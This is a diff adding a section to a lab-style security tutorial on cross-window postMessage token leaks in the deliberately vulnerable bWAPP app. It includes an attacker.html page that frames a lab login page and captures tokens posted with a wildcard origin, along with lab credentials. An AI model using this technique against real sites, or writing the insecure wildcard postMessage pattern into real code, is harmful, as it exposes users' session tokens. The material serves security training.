@@ -104,3 +104,41 @@ The attacker could use this JavaScript code below to steal the user data using I
         var contactsList=JSON.parse(event.data); 
         fillContactsList(contactsList);
     }
+
+## Another Example from bwapp
+
+Load the iframe into a page called attacker.html
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+            <meta charset="utf-8">
+            <title>Page!</title>
+            <script type="text/javascript">
+                    window.addEventListener("message", (event) => {
+                            alert(event.data);
+                    }, false);
+            </script>
+    </head>
+    <body>
+            <iframe src="http://demo.ine.local/login_iframe.php" width="600" height="500"></iframe>
+    </body>
+    </html>
+
+### Note
+
+The login_iframe.php has a js file that does the following:
+
+    window.parent.postMessage(token, "*");
+
+Which sends the token to the parent document
+
+Open the webpage and ou should see an alert showing **null** because no token is sent at first.
+
+Now login with the provided credentials:
+
+Username:admin
+
+Password:xbox360
+
+![cross-window](images/cross-window.png)
